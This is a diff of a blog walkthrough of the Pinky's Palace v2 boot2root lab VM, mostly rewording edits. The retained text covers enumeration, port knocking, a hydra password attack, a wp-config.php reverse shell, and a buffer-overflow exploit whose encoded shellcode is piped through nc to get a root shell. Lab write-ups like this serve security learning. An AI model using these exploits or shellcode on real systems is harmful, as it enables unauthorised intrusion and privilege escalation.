@@ -22,7 +22,7 @@ This is a realistic and ***hellish*** (emphasis mine) boot2root. The goal is to 
 
 ### Information Gathering
 
-My usual practice is to start with a `nmap` scan to establish the services available in the host.
+Let's kick this off with a `nmap` scan to establish the services available in the host.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
@@ -39,11 +39,11 @@ PORT      STATE    SERVICE REASON         VERSION
 31337/tcp filtered Elite   no-response
 ```
 
-`nmap` finds one open port `tcp/80`, no SSH service, and a bunch of filter ports. Although I don't know what to make of them at this point, they may prove interesting later.
+`nmap` finds one open port `tcp/80`, no SSH service, and a bunch of filter ports. Although I don't know what to make of the filtered ports now, they may prove interesting later. Who knows?
 
 ### Directory/File Enumeration
 
-I always like to use `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) to fuzz for directories and/or files. Here, I find two WordPress installations and the presence of one interesting directory `/secret` in the host.
+I've always like to use `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) to fuzz for directories and/or files because they produce results. Here, I find two WordPress installations and the presence of one interesting directory `/secret` in the host.
 
 ```
 # wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 http://pinkydb/FUZZ
@@ -68,7 +68,7 @@ ID	Response   Lines      Word         Chars          Payload
 019965:  C=301      9 L	      28 W	    322 Ch	  "wp-includes"
 ```
 
-When I look at `/secret`, I see a text file `bambam.txt`, with the following content.
+When I point my browser to `/secret`, I see a text file `bambam.txt`, with the following content.
 
 ```
 # curl http://pinkydb/secret/bambam.txt
@@ -79,7 +79,7 @@ When I look at `/secret`, I see a text file `bambam.txt`, with the following con
 pinkydb
 ```
 ### WordPress
-Since we know there's WordPress installed in `pinkydb`, let's use `wpscan` to scan for WordPress vulnerabilities, if any.
+Let's use `wpscan` to scan for WordPress vulnerabilities since there's WordPress installed in `pinkydb`.
 
 ```
 # wpscan --url pinkydb --enumerate u
@@ -111,7 +111,7 @@ _______________________________________________________________
 
 `wpscan` finds no exploitable vulnerabilities and identifies one WordPress user `pinky1337`.
 
-I spotted non-English words while I was skimming through the blog. Based on experience, there's a good chance one of these words is a password. Although none of the words yields any results for WordPress, it's still a good time to build a custom wordlist with `cewl` , so that when the need for a dictionary attack arises, I can use it.
+I spotted non-English words while I was skimming through the blog. Based on experience, there's a good chance one of these words is a password. Although none of the words yields any results for WordPress, it's still a good time to build a custom wordlist with `cewl` , so that I can use it when the need for a dictionary attack arises.
 
 ```
 # cewl -m3 pinkydb 2>/dev/null | sed 1d | tee cewl.txt
@@ -120,9 +120,11 @@ I spotted non-English words while I was skimming through the blog. Based on expe
 
 ### Knock Knock. Who's There?
 
-Looking at the numbers in `bambam.txt`, and if I've to guess, I'm probably looking at port numbers (`0-65535`) and that suggests port-knocking is in the works.
+Looking at the numbers in `bambam.txt`, and if I've to guess, I'm probably looking at port numbers (`0-65535`) and that suggests port-knocking.
 
-To that end, I wrote a port-knocking script, `knock.sh` using `nmap`.
+Although we have three port numbers, the order or sequence of knocking, to unlock the ports, is unknown at this point.
+
+To that end, I wrote a port-knocking script, `knock.sh`, to determine the correct sequence using `nmap`.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -191,11 +193,11 @@ The service at `tcp/7654` appears to be running `nginx`, while the service at `t
 
 ### Pinky's Database
 
-The page at `http://pinkydb:7654/login.php` appears to be Pinky's database login — the attack surface.
+The attack surface is at `http://pinkydb:7654/login.php` — Pinky's database login.
 
 ![screenshot-1](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-1.png)
 
-Remember the custom wordlist we built earlier? Perhaps it's time we put it to good use with `hydra` and see what we get?
+Remember the custom wordlist we built earlier? Now it's the time we put it to good use with `hydra`.
 
 ```
 # echo pinky > usernames.txt
@@ -242,7 +244,7 @@ With the password out of the way, it's almost trivial to log in to `stefano`'s a
 
 ### Privilege Escalation
 
-I notice `/home/stefano/tools/qsub` and `/usr/local/bin/backup.sh` during enumeration of `stefano`'s account; I think they may be key pieces to the privilege escalation puzzle. Here's why.
+I notice `/home/stefano/tools/qsub` and `/usr/local/bin/backup.sh` during enumeration of `stefano`'s account; they may be key pieces to the privilege escalation puzzle. Here's why.
 
 _Image shows `pinky` and `www-data` have the rights to read `qsub`._
 
@@ -261,7 +263,7 @@ $ find /var/www -perm /o+w
 
 I edit `wp-config.php` to run a reverse shell as `www-data`.
 
-_Image shows that I can execute remote command on `pinkydb` as `www-data`._
+_Image shows remote command execution on `pinkydb` as `www-data`._
 
 ![screenshot-7](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-7.png)
 
@@ -324,7 +326,7 @@ To recap, the work is far from complete; the final piece of the privilege escala
 
 ![screenshot-18](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-18.png)
 
-I use `scp` to grab a copy of `/daemon/panel` to my analysis machine (it runs 64-bit Kali Linux and replicates the conditions of `pinkydb` as close as possible) so that I can analyze it with `gdb` and [PEDA](https://github.com/longld/peda). To be more precise, I run `./panel` and attach `gdb` to it so that I can debug it — a kind of dynamic analysis technique as opposed to reverse engineering.
+I use `scp` to grab a copy of `/daemon/panel` to my analysis machine (it runs 64-bit Kali Linux and replicates the conditions of `pinkydb` as close as possible) so that I can analyze it with `gdb` and [PEDA](https://github.com/longld/peda). To be more precise, I run `./panel` and attach `gdb` to it so that I can debug it — a dynamic analysis technique as opposed to reverse engineering.
 
 ![screenshot-19](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-19.png)
 
@@ -334,7 +336,7 @@ Using `readelf`, I'm able to spot the `main()` function, along with the `handlec
 
 ![screenshot-20](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-20.png)
 
-After disassembling the `handlecmd()` function with `gdb`, I place a breakpoint at `<handlecmd+70>`. At this point, I can analyze the stack overflow and the offset with which to control the RIP before the program takes back control.
+After disassembling the `handlecmd()` function with `gdb`, I place a breakpoint at `<handlecmd+70>`. At the breakpoint, I can analyze the stack overflow and the offset with which to control the RIP before the program takes back control.
 
 ![screenshot-21](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-21.png)
 
@@ -370,13 +372,13 @@ The generated payload is 119 bytes, and fits in nicely onto the given 120 bytes 
 
 ### Getting to the `root` of the matter
 
-The stage is now set for the real privilege escalation.
+The stage is now set for the real privilege escalation. I run the following command on my machine.
 
 ```
 # perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
 ```
 
-On my `netcat` listener, a `root` shell appears.
+On my `netcat` listener that I've set up, a `root` shell appears.
 
 ![screenshot-28](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-28.png)
 
@@ -388,7 +390,7 @@ After spawning a better looking shell with a bunch of keystrokes, the flag is ba
 
 ### Afterthought
 
-To be honest, I thought Pinky's Palace was a misnomer; it should be Pinky's Dungeon instead :sweat_smile:
+To be honest, I think Pinky's Palace is a misnomer; it should be Pinky's Dungeon :sweat_smile:
 
 Walking through this VM took longer than usual because I had to document down the crucial sections and had to take more screen captures. It certainly lived up to its name of being harder than the first one, with the reverse engineering of `qsub`, and the exploit development for `panel`.
 
